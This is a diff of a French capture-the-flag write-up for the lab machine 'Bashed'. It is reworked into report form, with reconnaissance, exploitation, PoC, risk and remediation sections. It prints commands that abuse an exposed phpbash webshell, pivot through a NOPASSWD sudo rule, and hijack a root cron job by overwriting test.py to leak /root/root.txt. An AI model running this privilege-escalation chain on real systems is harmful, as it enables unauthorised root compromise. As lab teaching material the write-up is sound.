@@ -8,27 +8,27 @@
 
 ---
 
-## Résumé
+## Description
 
-Bashed s'exploite via un **webshell PHP laissé en clair** dans un répertoire du serveur (`/dev/phpbash.php`). Le foothold se fait donc directement dans le navigateur en tant que `www-data`. La privesc exploite une **règle sudo NOPASSWD** permettant de devenir `scriptmanager`, puis un **cron root** qui exécute un script appartenant à `scriptmanager` — on injecte notre code pour qu'il tourne en root.
+Bashed s'exploite via un **webshell PHP laissé en clair** dans un répertoire du serveur (`/dev/phpbash.php`), un outil de développement/debug oublié en production. Ce type de faille s'inscrit dans le *workflow* de déploiement de l'application : des fichiers d'administration/debug non destinés à la production restent accessibles publiquement et offrent une exécution de commandes arbitraire sans authentification. La privesc exploite ensuite une **règle sudo NOPASSWD** permettant de devenir `scriptmanager`, puis un **cron root** qui exécute un script appartenant à `scriptmanager` — on injecte du code dans ce script pour qu'il s'exécute en root.
 
 ---
 
-## 1. Énumération
+## Exploitation
 
-### Scan Nmap
+### 1. Reconnaissance
 
 ```bash
 nmap -p- 10.129.5.182
 ```
 
-**Résultat :** un seul port ouvert.
+Un seul port ouvert :
 
 | Port | Service | Version       |
 |------|---------|---------------|
 | 80   | HTTP    | Apache 2.4.18 |
 
-### Fuzzing de répertoires (Gobuster)
+### 2. Fuzzing de répertoires (Gobuster)
 
 ```bash
 gobuster dir -u http://10.129.5.182/ \
@@ -36,42 +36,28 @@ gobuster dir -u http://10.129.5.182/ \
   -x php,html,txt
 ```
 
-**Découverte clé :** le répertoire `/dev`.
-
-En explorant `/dev`, on trouve :
+Découverte clé : le répertoire `/dev`, qui contient :
 
 ```
 /dev/phpbash.php
 ```
 
-C'est un **webshell PHP** (phpbash) — une console interactive directement exécutable dans le navigateur.
+C'est un **webshell PHP** (phpbash) — une console interactive exécutable directement dans le navigateur.
 
-> **Pourquoi ça marche :** phpbash est un outil de dev/debug qui n'aurait jamais dû rester en prod. Il donne une exécution de commandes arbitraire sans authentification. Réflexe : toujours fuzzer les répertoires "oubliés" (`/dev`, `/backup`, `/old`, `/test`).
+### 3. Accès initial (foothold)
 
----
-
-## 2. Accès initial (foothold)
-
-On ouvre `http://10.129.5.182/dev/phpbash.php` → on obtient un shell interactif dans le navigateur.
-
-Contexte d'exécution :
+Ouverture de `http://10.129.5.182/dev/phpbash.php` → shell interactif dans le navigateur.
 
 ```bash
 whoami
 # www-data
 ```
 
-### Flag user
-
 ```bash
 cat /home/arrexel/user.txt
 ```
 
----
-
-## 3. Élévation de privilèges
-
-### Étape 1 — www-data → scriptmanager
+### 4. Élévation de privilèges — étape 1 : www-data → scriptmanager
 
 Vérification des droits sudo :
 
@@ -79,86 +65,101 @@ Vérification des droits sudo :
 sudo -l
 ```
 
-**Résultat :**
+Résultat :
 
 ```
 (scriptmanager) NOPASSWD: ALL
 ```
 
-→ `www-data` peut exécuter **n'importe quelle commande en tant que `scriptmanager`, sans mot de passe**.
-
-On inspecte ce que possède scriptmanager :
+`www-data` peut exécuter n'importe quelle commande en tant que `scriptmanager`, sans mot de passe.
 
 ```bash
 sudo -u scriptmanager ls -la /scripts
 ```
 
-**Résultat :**
+Résultat :
 
 ```
 test.py    → propriété de scriptmanager
 test.txt   → propriété de root, horodatage récent
 ```
 
-> **Le signal clé :** `test.txt` appartient à **root** et sa date de modification change régulièrement. Ça trahit un **cron tournant en root** qui exécute `test.py` et écrit `test.txt`. Or `test.py` nous appartient (scriptmanager) → **on contrôle du code exécuté par root**.
+Le signal clé : `test.txt` appartient à root et son horodatage change régulièrement, ce qui trahit un cron root exécutant `test.py`. Or `test.py` appartient à `scriptmanager`, que l'on contrôle déjà.
 
-### Étape 2 — scriptmanager → root (cron hijack)
+### 5. Élévation de privilèges — étape 2 : scriptmanager → root (cron hijack)
 
-Le vecteur : `test.py` est modifiable par nous mais exécuté par root. On réécrit son contenu pour qu'il fasse fuiter le flag root.
-
-phpbash ne gère pas bien le multi-ligne, donc on réécrit le script **en une seule ligne** :
+`test.py` est modifiable par nous mais exécuté par root. On réécrit son contenu (en une seule ligne, phpbash ne gérant pas bien le multi-ligne) pour qu'il exfiltre le flag root :
 
 ```bash
 sudo -u scriptmanager bash -c 'echo "import os; os.system(\"cat /root/root.txt > /tmp/flag.txt; chmod 644 /tmp/flag.txt\")" > /scripts/test.py'
 ```
 
-Ce que fait le payload :
-- root exécutera `test.py` au prochain passage du cron ;
-- il lira `/root/root.txt` et le copiera dans `/tmp/flag.txt` ;
-- `chmod 644` rend le fichier lisible par `www-data`.
-
-Vérifier que le payload est bien en place :
+Vérification du payload en place :
 
 ```bash
 sudo -u scriptmanager cat /scripts/test.py
 ```
 
-### Récupération du flag
-
-Attendre ~1 min (passage du cron), puis :
+Après ~1 minute (passage du cron) :
 
 ```bash
 cat /tmp/flag.txt
 ```
 
-→ **flag root**.
-
 ---
 
-## Chaîne d'attaque (récap)
+## PoC
 
-```
-Nmap (80)
-   └─> Gobuster : /dev
-        └─> phpbash.php (webshell PHP)
-             └─> foothold www-data + user.txt
-                  └─> sudo -l : (scriptmanager) NOPASSWD: ALL
-                       └─> sudo -u scriptmanager  (pivot)
-                            └─> cron root exécute /scripts/test.py (modifiable)
-                                 └─> injection payload → root.txt via /tmp
+**Accès webshell :**
+
+```http
+GET /dev/phpbash.php HTTP/1.1
+Host: 10.129.5.182
 ```
 
+**Pivot sudo :**
+
+```bash
+sudo -l
+sudo -u scriptmanager ls -la /scripts
+```
+
+**Injection dans le script exécuté par le cron root :**
+
+```bash
+sudo -u scriptmanager bash -c 'echo "import os; os.system(\"cat /root/root.txt > /tmp/flag.txt; chmod 644 /tmp/flag.txt\")" > /scripts/test.py'
+cat /tmp/flag.txt
+```
+
 ---
 
-## Leçons / points de sécu
+## Risk
 
-- **Outils de dev en prod** : phpbash, phpinfo, backups… à ne jamais laisser exposés.
-- **sudo NOPASSWD trop large** : un `NOPASSWD: ALL` vers un autre user est un pivot direct. Restreindre au strict binaire nécessaire.
-- **Cron + fichier modifiable** : classique. Un processus privilégié ne doit jamais exécuter un fichier writable par un compte moins privilégié.
-- **À retenir (pattern général) :** détourner un processus root qui exécute un fichier modifiable (cron, systemd timer, PATH hijack…). C'est un des schémas de privesc Linux les plus fréquents.
+- **Webshell exposé sans authentification** : n'importe quel visiteur peut exécuter des commandes arbitraires sur le serveur avec les privilèges de `www-data`, ce qui constitue une exécution de code à distance non authentifiée.
+- **Règle sudo `NOPASSWD: ALL` trop permissive** : elle transforme un accès `www-data` limité en un accès complet au compte `scriptmanager`, sans aucune barrière.
+- **Processus privilégié exécutant un fichier modifiable par un utilisateur moins privilégié** : le cron root exécutant `/scripts/test.py` (modifiable par `scriptmanager`) permet une élévation directe jusqu'à root.
+- **Impact global** : compromission complète de la machine (root), avec accès à toutes les données et possibilité de persistance/mouvement latéral.
 
 ---
 
-## Outils utilisés
+## Remediation
 
-`nmap` · `gobuster` · navigateur (phpbash) · `sudo` · `cron`
+- Retirer tout outil de développement/debug (webshells, consoles interactives type phpbash, `phpinfo()`, backups) des environnements de production, et s'assurer qu'ils ne sont jamais déployés par erreur (pipeline CI/CD, `.gitignore`, revue de déploiement).
+- Restreindre les règles sudo au strict nécessaire : éviter `NOPASSWD: ALL` vers un autre compte ; n'autoriser que les binaires/scripts précis requis par le besoin métier.
+- Ne jamais faire exécuter par un processus privilégié (cron, systemd timer, service root) un fichier modifiable par un utilisateur moins privilégié ; appliquer des permissions strictes (root:root, 700) sur les scripts exécutés par cron root.
+- Auditer régulièrement les tâches cron root et leurs dépendances (fichiers, PATH) pour détecter ce type de détournement possible.
+
+---
+
+## Résumé
+
+**Machine :** Bashed
+**Vulnérabilité principale :** Webshell PHP exposé + sudo NOPASSWD trop permissif + cron root exécutant un fichier modifiable
+**Accès initial :** Webshell `phpbash.php` (www-data)
+**Privilèges obtenus :** Root
+
+**Flags :**
+- User : récupéré via `cat /home/arrexel/user.txt`
+- Root : récupéré via `cat /tmp/flag.txt` après détournement du cron
+
+**Outils utilisés :** `nmap` · `gobuster` · navigateur (phpbash) · `sudo` · `cron`
